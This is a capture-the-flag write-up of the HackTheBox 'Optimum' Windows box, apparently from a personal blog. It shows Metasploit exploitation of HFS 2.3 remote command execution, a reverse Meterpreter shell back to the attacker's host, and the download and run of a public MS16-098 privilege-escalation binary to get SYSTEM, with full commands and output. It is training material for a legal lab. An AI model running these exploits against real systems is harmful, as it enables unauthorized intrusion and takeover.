---
title: HackTheBox - Optimum
categories: writeups
layout: post
date: 2020-07-20 23:21 -0500
---
![Optimum](/assets/images/HTBoxes/Optimum/Optimum.png)

## Summary

Optimum is a fairly straightforward easy rated Windows box.  It involves simple enumeration and exploitation via a readily available metasploit module for a foothold.  For privilege escalation, it requires enumeration of patch levels of the system to determine a relevant exploit for escalation.

## Walkthrough

### Enumeration

Ran the usual nmap ``nmap -A -T4 -v 10.10.10.8``

```console
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

I went to the website and saw it is running [HTTP File Server software](https://www.rejetto.com/hfs/) v2.3.

![Optimum-website](/assets/images/HTBoxes/Optimum/optimum-website.png)

I did a ``searchsploit hfs`` and found this version seems to be vulnerable.

### Foothold

I loaded up msfconsole via ``msfconsole -q`` and found that there is a RCE metasploit module that we can use to gain a foothold.

```console
msf5 > search hfs

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2
014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST 10.10.14.2
SRVHOST => 10.10.14.2
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Using URL: http://10.10.14.2:8080/Kzl4K6JceE
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /Kzl4K6JceE
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.8:49162) at 2020-07-20 21:32:54 -0500
[!] Tried to delete %TEMP%\ytefKHKvAX.vbs, unknown result
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas
```

### User

I listed the kostas desktop folder and there was a user.txt.  No need to pivot so I grabbed the user.txt sitting in the Desktop folder.

### Root

Now that I had user it was time to enumerate to find a path to admin.  I used the windows exploit suggester [tool]( https://github.com/GDSSecurity/Windows-Exploit-Suggester).

To gather the systeminfo for it I just used the meterpreter session:

```console
meterpreter > execute -f cmd.exe -a "/c systeminfo > systeminfo.txt"
Process 2072 created.
meterpreter > dir
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-07-27 06:31:27 -0500  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 06:57:16 -0500  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 05:58:52 -0600  hfs.exe
100666/rw-rw-rw-  3334    fil   2020-07-27 07:16:36 -0500  systeminfo.txt
100444/r--r--r--  32      fil   2017-03-18 07:13:18 -0500  user.txt.txt

meterpreter > download systeminfo.txt
[*] Downloading: systeminfo.txt -> systeminfo.txt
[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): systeminfo.txt -> systeminfo.txt
[*] download   : systeminfo.txt -> systeminfo.txt
```

To get the script to run, it requires python2 and a library dependency.  I suggest using ``pipenv`` in the cloned folder.

```console
pipenv --python 2.7
pipenv install xlrd
pipenv run python2 ./windows-exploit-suggester.py --database 2020-07-20-mssb.xls --systeminfo systeminfo.txt
```

After executing the script, there's quite a few suggestions.  The one in the official HTB writeup is MS016-032.  However, I had issues trying to get it to work from metasploit.  After some googling I decided to try MS16-098.

``wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe``

Back in my meterpreter session I did a ``upload 41020.exe`` then opened a shell to execute it.

```console
meterpreter > shell
Process 2336 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>.\41020.exe
.\41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

After this I simply went to the Desktop directory and grabbed the root.txt flag.

## Lessons Learned

On this box:

* Refreshed metasploit module searching and exploit execution
* Learned about a new python based windows priv esc tool (the suggester tool)
